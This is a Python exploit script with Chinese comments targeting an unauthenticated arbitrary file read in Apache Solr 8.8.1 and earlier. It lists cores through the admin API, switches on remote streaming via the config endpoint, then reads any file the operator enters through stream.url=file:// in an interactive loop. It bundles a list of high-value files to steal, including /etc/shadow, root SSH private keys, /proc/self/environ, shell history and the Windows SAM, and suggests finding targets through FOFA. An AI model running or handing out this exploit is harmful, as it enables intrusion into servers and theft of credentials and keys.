# -*- coding: UTF-8 -*-
#@author Firebasky
import requests
import json

"""
Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件
漏洞影响 Apache Solr <= 8.8.1
搜索：FOFA：Apache Solr <= 8.8.1
"""

def POC_1(target_url):
    #检查是否存在未授权访问并且获得我们需要的路径
    path_url = target_url + "/solr/admin/cores?indexInfo=false&wt=json"
    try:
        response = requests.request("GET", url=path_url, timeout=10)
        path_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得path_name,Url为：" + target_url + "/solr/" + path_name + "/config\033[0m")
        return path_name
    except:
        print("目标Url漏洞利用失败")
        exit(0)

def POC_2(target_url, path_name):
    #设置requestDispatcher.requestParsers.enableRemoteStreaming=true
    vuln_url = target_url + "/solr/" + path_name + "/config"
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    data = json.dumps(data)
    headers = {"Content-type": "application/json","Accept": "*/*"}
    r=requests.post(vuln_url, data=data, headers=headers)

def POC_3(target_url, path_name, File_name):
    #访问利用点进行读文件
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(path_name)
    print(vuln_url)
    data = 'stream.url=file://{}'.format(File_name)
    #输入我们读的文件
    headers = {"Content-type": "application/x-www-form-urlencoded"}
    r=requests.post(vuln_url, data=data, headers=headers)
    print(r.text)

"""
linux下一些重要信息
/proc/net/arp
/etc/hosts 
/etc/crontab
/proc/net/fib_trie
/proc/self/cmdline
/proc/self/environ 
/proc/self/cwd
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
//ssh私钥,ssh公钥是id_rsa.pub
/root/.ssh/id_ras.keystore
//记录每个访问计算机用户的公钥
/root/.ssh/known_hosts
//记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow        //账户密码文件
/etc/my.cnf       //mysql配置文件
/etc/httpd/conf/httpd.conf   //apache配置文件
/root/.bash_history         //用户历史命令记录文件
/root/.mysql_history       //mysql历史命令记录文件
/proc/self/fd/fd[0-9]*(文件标识符)  
/proc/mounts              //记录系统挂载设备
/porc/config.gz           //内核配置文件
/var/lib/mlocate/mlocate.db          //全文件路径
"""

"""
windows下一些重要信息
C:\Program Files\mysql\my.ini //Mysql配置
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息 
C:\Windows\win.ini //Windows系统的一个基本系统配置文件
"""

if __name__ == '__main__':
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> "))
    path_name = POC_1(target_url)
    # print(path_name)
    POC_2(target_url, path_name)
    while True:
        File_name = str(input("\033[35mWant to read File>>> "))
        POC_3(target_url, path_name, File_name)
